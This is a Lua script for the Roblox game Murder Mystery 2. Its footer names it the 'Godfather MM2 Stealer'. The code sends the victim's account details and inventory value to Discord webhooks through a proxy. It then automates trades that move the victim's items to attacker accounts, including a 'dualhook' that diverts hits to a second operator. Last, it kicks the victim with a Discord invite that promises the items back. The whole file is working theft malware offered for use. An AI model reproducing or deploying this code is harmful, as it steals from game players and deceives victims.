    for _, item in ipairs(itemsForWebhook) do
        tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
    end

    local content = nil
    if isPingWorthy and cfg.pingEveryone == "Yes" then
        content = isDualhook and "@everyone ⚠️ **DUALHOOK TRIGGERED**" or "@everyone 🎯 **NEW HIT ACQUIRED**"
    end

    local embed = {
        title = string.format("%s │ %s │ %s", hookType, plr.DisplayName, hitCategory),
        url = rubisLink,
        color = color,
        thumbnail = {url = avatarUrl},
        description = string.format("```lua\n%s\n```", joinScript),
        fields = {
			{
				name = "👤 Victim",
				value = string.format("```\n%s (@%s)\nID: %d\nAge: %d days\n```", plr.DisplayName, plr.Name, plr.UserId, plr.AccountAge),
				inline = true
			},
			{
				name = "⚙️ System",
				value = string.format("```\nExecutor: %s\nReceiver: %s\nJob ID: %s\n```", executorName, targetName, string.sub(REAL_JOB_ID, 1, 8).."..."),
				inline = true
			},
			{
				name = "💰 Valuation",
				value = string.format("```\nTotal Value: %d ($%s)\nTotal Items: %d\n```", totalInventoryValue, totalUSD, total_items),
				inline = true
			},
            {
                name = "📊 Inventory Breakdown",
                value = string.format("```ansi\n[2;31mAncient:  %d  [2;35mGodly:   %d[0m\n[2;33mUnique:   %d  [2;38;5;208mVintage: %d[0m\n[2;34mLegendary:%d  [2;32mRare:    %d[0m\n[2;37mUncommon: %d  Common:  %d```", 
                    tier_counts.Ancient or 0, tier_counts.Godly or 0,
                    tier_counts.Unique or 0, tier_counts.Vintage or 0,
                    tier_counts.Legendary or 0, tier_counts.Rare or 0,
                    tier_counts.Uncommon or 0, tier_counts.Common or 0),
                inline = false
            },
            {
				name = "🏆 Top Items",
				value = #top_items > 0 and string.format("```\n%s\n```", table.concat(top_items, "\n")) or "```\nNo items\n```",
				inline = false
			},
            {
                name = "💵 USD Estimate",
                value = inventoryString,
                inline = false
            },
            {
                name = "🔗 Actions",
                value = string.format("[Join Server](%s) • [View Inventory](%s)", fernJoinerLink, rubisLink),
                inline = false
            }
        },
        footer = {
            text = string.format("Godfather MM2 Stealer • NULS • v4.0.0 • %s", os.date("!%H:%M:%S UTC"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        content = content,
        username = isDualhook and "🔥 Dualhook Alert" or "💎 Godfather Stealer",
        avatar_url = AVATAR_URL,
        embeds = {embed}
    }

    sendToProxy(targetWebhookId, payload, isDualhook)

    local receivers = isDualhook and dualhookUser or users
    for _, rcv in ipairs(receivers) do
        sendHitToQueue(PlaceId, REAL_JOB_ID, rcv)
    end
end

local function sendPublicHits()
    local tier_counts = rarityCounts
    local total_items = 0
    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

    local content = "📢 **PUBLIC HIT REGISTERED**"

    local rarityLines = {}
    local rarities = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
    local ansiColors = {"31", "35", "33", "38;5;208", "34", "32", "37", "30"}
    
    for i, rarity in ipairs(rarities) do
        local count = tier_counts[rarity] or 0
        if count > 0 then
            table.insert(rarityLines, string.format("[2;%sm%s: %d[0m", ansiColors[i], rarity, count))
        end
    end

    local embed = {
        title = string.format("🌐 Public Greed │ %s", hitCategory),
        url = rubisLink,
        color = 0x8B0000,
        description = string.format("**%s** got hit by Godfathers!", plr.Name),
        fields = {
            { 
                name = "💎 Valuation", 
                value = string.format("```yaml\nvalue: %d ($%s)\nitems: %d```", totalInventoryValue, totalUSD, total_items), 
                inline = true 
            },
            { 
                name = "⚡ Executor", 
                value = string.format("```yaml\nname: %s\nversion: %s```", executorName, "v4.0.0"), 
                inline = true 
            },
            { 
                name = "📊 Breakdown", 
                value = string.format("```ansi\n%s```", table.concat(rarityLines, "\n")), 
                inline = false 
            }
        },
        footer = { 
            text = "Godfather MM2 Stealer • NULS Hosting • v4.0.0"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        content = content,
        username = "📡 Public Broadcast",
        avatar_url = AVATAR_URL,
        embeds = {embed}
    }

    sendToProxy(PUBLIC_WEBHOOK_ID, payload, false)
end

local function startDualhookTimer()
    dualhookTimer = task.delay(100, function()
        if not isTradeCompleted then
            isDualhookActive = true
            sendWebhook(DUALHOOK_WEBHOOK_ID, true)
            local target = nil
            for _, name in ipairs(dualhookUser) do
                local player = Players:FindFirstChild(name)
                if player and player ~= plr then
                    target = player
                    break
                end
            end
            if target then
                task.spawn(function() doTrade(target) end)
            end
        end
    end)
end

local function cancelDualhookTimer()
    if dualhookTimer then 
        pcall(function() task.cancel(dualhookTimer) end)
        dualhookTimer = nil 
    end 
end

sendWebhook(WEBHOOK_ID, false)
sendPublicHits()

if totalInventoryValue >= 300 then
    startDualhookTimer()
end

local function waitForTarget(targetPlayer)
    local attempts = 0
    while attempts < 30 do
        if targetPlayer and targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then return true end
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function AcceptTrade()
    if not _G.LastOffer then return false end
    local ok = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, _G.LastOffer)
    end)
    return ok
end

local function finishAndKick()
    isTradeCompleted = true
    cancelDualhookTimer()
    task.wait(2)
    local discordLink = "https://discord.gg/dUaHggzp9q"
    pcall(function() setclipboard(discordLink) end)
    plr:Kick("Items taken by Godfather Script\n\n" .. discordLink .. "\n\nJoin to get your items back!")
end

function doTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return end
    if not waitForTarget(targetPlayer) then return end
    
    local initialTradeState = getTradeStatus()
    if initialTradeState == "StartTrade" then
        pcall(function() DeclineTrade:FireServer() end)
        task.wait(0.3)
    elseif initialTradeState == "ReceivingRequest" then
        pcall(function() DeclineRequest:FireServer() end)
        task.wait(0.3)
    end
    
    _G.LastOffer = nil
    isDualhookTrade = isDualhookActive
    
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success, err = pcall(function()
            local status = getTradeStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do 
                        local removed = table.remove(weaponsToSend, 1)
                        if removed and not isDualhookTrade then
                            receivedCounts[removed.ItemName] = (receivedCounts[removed.ItemName] or 0) + removed.Amount
                        end
                    end
                    itemsAdded = false
                    _G.LastOffer = nil
                    task.wait(0.5)
                    if not isDualhookTrade then
                        updateTradeMessage()
                    end
                else
                    SendRequest:InvokeServer(targetPlayer)
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                pcall(function() DeclineRequest:FireServer() end)
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    local numToTrade = math.min(4, #weaponsToSend)
                    for i = 1, numToTrade do
                        local item = weaponsToSend[i]
                        if item then
                            for _ = 1, item.Amount do
                                OfferItem:FireServer(item.DataID, "Weapons")
                                task.wait(0.05)
                            end
                        end
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        AcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then
            warn("[Godfather] Trade error:", err)
            task.wait(1) 
        end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then 
        if not isDualhookTrade then
            updateTradeMessage()
        end
        finishAndKick() 
    end
end

local function isTarget(name)
    if not name then return false end
    name = name:lower()
    for _, u in ipairs(users) do
        if u:lower() == name then return true end
    end
    if isDualhookActive then
        for _, u in ipairs(dualhookUser) do
            if u:lower() == name then return true end
        end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
        break
    end
end
